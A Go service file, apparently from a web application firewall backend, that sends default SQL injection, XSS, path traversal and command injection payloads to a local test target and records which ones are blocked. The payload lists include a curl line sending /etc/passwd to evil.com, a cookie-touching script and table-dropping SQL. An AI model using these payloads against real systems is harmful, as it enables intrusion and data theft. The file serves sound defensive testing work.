package services

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"time"
	"waf-backend/dto"
	"waf-backend/utils"

	"github.com/sirupsen/logrus"
)

type SecurityTestService struct {
	log       *logrus.Logger
	targetURL string
	client    *http.Client
}

func NewSecurityTestService(log *logrus.Logger) *SecurityTestService {
	return &SecurityTestService{
		log:       log,
		targetURL: utils.GetEnv("TARGET_URL", "http://waf-local.dev"),
		client: &http.Client{
			Timeout: 10 * time.Second,
		},
	}
}

func (s *SecurityTestService) RunSecurityTest(testType string, customPayloads []string) (*dto.SecurityTest, error) {
	s.log.WithFields(logrus.Fields{
		"test_type": testType,
		"payloads":  len(customPayloads),
	}).Info("Running security test")

	test := &dto.SecurityTest{
		ID:          generateTestID(),
		Name:        fmt.Sprintf("%s Security Test", strings.Title(strings.ReplaceAll(testType, "_", " "))),
		Description: fmt.Sprintf("Testing %s vulnerabilities against WAF", testType),
		TestType:    testType,
		Results:     make([]dto.SecurityResult, 0),
		CreatedAt:   time.Now(),
	}

	var payloads []string
	if len(customPayloads) > 0 {
		payloads = customPayloads
	} else {
		payloads = s.getDefaultPayloads(testType)
	}

	test.Payloads = payloads

	// 각 페이로드에 대해 테스트 실행
	for _, payload := range payloads {
		result := s.testPayload(payload, testType)
		test.Results = append(test.Results, result)
		
		// 테스트 간 잠깐의 지연
		time.Sleep(100 * time.Millisecond)
	}

	s.log.WithFields(logrus.Fields{
		"test_id":       test.ID,
		"total_tests":   len(test.Results),
		"blocked_tests": s.countBlockedTests(test.Results),
	}).Info("Security test completed")

	return test, nil
}

func (s *SecurityTestService) testPayload(payload, testType string) dto.SecurityResult {
	result := dto.SecurityResult{
		Payload:    payload,
		Blocked:    false,
		StatusCode: 0,
		Response:   "",
	}

	var req *http.Request
	var err error

	switch testType {
	case "sql_injection":
		req, err = s.createSQLInjectionRequest(payload)
	case "xss":
		req, err = s.createXSSRequest(payload)
	case "path_traversal":
		req, err = s.createPathTraversalRequest(payload)
	case "command_injection":
		req, err = s.createCommandInjectionRequest(payload)
	default:
		req, err = s.createGenericRequest(payload)
	}

	if err != nil {
		result.Response = fmt.Sprintf("Error creating request: %v", err)
		return result
	}

	// WAF 테스트를 위한 헤더 추가
	req.Header.Set("Host", "waf-local.dev")
	req.Header.Set("User-Agent", "WAF-Security-Test/1.0")

	resp, err := s.client.Do(req)
	if err != nil {
		result.Response = fmt.Sprintf("Error making request: %v", err)
		return result
	}
	defer resp.Body.Close()

	result.StatusCode = resp.StatusCode

	// 응답 읽기 (최대 1KB)
	body, err := io.ReadAll(io.LimitReader(resp.Body, 1024))
	if err != nil {
		result.Response = fmt.Sprintf("Error reading response: %v", err)
	} else {
		result.Response = string(body)
	}

	// 403 Forbidden 또는 406 Not Acceptable이면 WAF에 의해 차단된 것으로 간주
	result.Blocked = (resp.StatusCode == 403 || resp.StatusCode == 406 || 
		strings.Contains(result.Response, "ModSecurity") ||
		strings.Contains(result.Response, "Access denied"))

	return result
}

func (s *SecurityTestService) createSQLInjectionRequest(payload string) (*http.Request, error) {
	// GET 요청으로 SQL Injection 페이로드 테스트
	testURL := fmt.Sprintf("%s/api/v1/ping?id=%s", s.targetURL, url.QueryEscape(payload))
	return http.NewRequest("GET", testURL, nil)
}

func (s *SecurityTestService) createXSSRequest(payload string) (*http.Request, error) {
	// GET 요청으로 XSS 페이로드 테스트
	testURL := fmt.Sprintf("%s/api/v1/ping?search=%s", s.targetURL, url.QueryEscape(payload))
	return http.NewRequest("GET", testURL, nil)
}

func (s *SecurityTestService) createPathTraversalRequest(payload string) (*http.Request, error) {
	// GET 요청으로 Path Traversal 페이로드 테스트
	testURL := fmt.Sprintf("%s/api/v1/ping?file=%s", s.targetURL, url.QueryEscape(payload))
	return http.NewRequest("GET", testURL, nil)
}

func (s *SecurityTestService) createCommandInjectionRequest(payload string) (*http.Request, error) {
	// POST 요청으로 Command Injection 페이로드 테스트
	data := url.Values{}
	data.Set("cmd", payload)
	
	req, err := http.NewRequest("POST", s.targetURL+"/api/v1/ping", 
		bytes.NewBufferString(data.Encode()))
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	return req, nil
}

func (s *SecurityTestService) createGenericRequest(payload string) (*http.Request, error) {
	// 기본 GET 요청
	testURL := fmt.Sprintf("%s/api/v1/ping?test=%s", s.targetURL, url.QueryEscape(payload))
	return http.NewRequest("GET", testURL, nil)
}

func (s *SecurityTestService) getDefaultPayloads(testType string) []string {
	switch testType {
	case "sql_injection":
		return []string{
			"' OR '1'='1",
			"1' OR '1'='1' --",
			"' UNION SELECT NULL--",
			"1; DROP TABLE users--",
			"' OR 1=1#",
			"admin'--",
			"' OR 'x'='x",
			"1' AND (SELECT COUNT(*) FROM users) > 0 --",
			"' OR SLEEP(5)--",
			"1' WAITFOR DELAY '00:00:05'--",
		}
	case "xss":
		return []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"javascript:alert('XSS')",
			"<svg onload=alert('XSS')>",
			"<iframe src=javascript:alert('XSS')>",
			"<body onload=alert('XSS')>",
			"<script>document.cookie='stolen='+document.cookie</script>",
			"<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
			"<link rel=stylesheet href=javascript:alert('XSS')>",
			"<style>@import'javascript:alert(\"XSS\")'</style>",
		}
	case "path_traversal":
		return []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
			"....//....//....//etc/passwd",
			"..%2F..%2F..%2Fetc%2Fpasswd",
			"..%5C..%5C..%5Cwindows%5Csystem32%5Cdrivers%5Cetc%5Chosts",
			"/etc/passwd",
			"C:\\windows\\system32\\drivers\\etc\\hosts",
			"file:///etc/passwd",
			"../../../var/log/apache2/access.log",
			"..\\..\\..\\boot.ini",
		}
	case "command_injection":
		return []string{
			"; ls -la",
			"| whoami",
			"& dir",
			"; cat /etc/passwd",
			"| ping -c 1 127.0.0.1",
			"; sleep 5",
			"& timeout 5",
			"`whoami`",
			"$(whoami)",
			"; curl http://evil.com/steal?data=$(cat /etc/passwd)",
		}
	default:
		return []string{
			"<script>alert('test')</script>",
			"' OR '1'='1",
			"../../../etc/passwd",
			"; ls -la",
		}
	}
}

func (s *SecurityTestService) countBlockedTests(results []dto.SecurityResult) int {
	count := 0
	for _, result := range results {
		if result.Blocked {
			count++
		}
	}
	return count
}

func generateTestID() string {
	return fmt.Sprintf("test_%d", time.Now().UnixNano())
}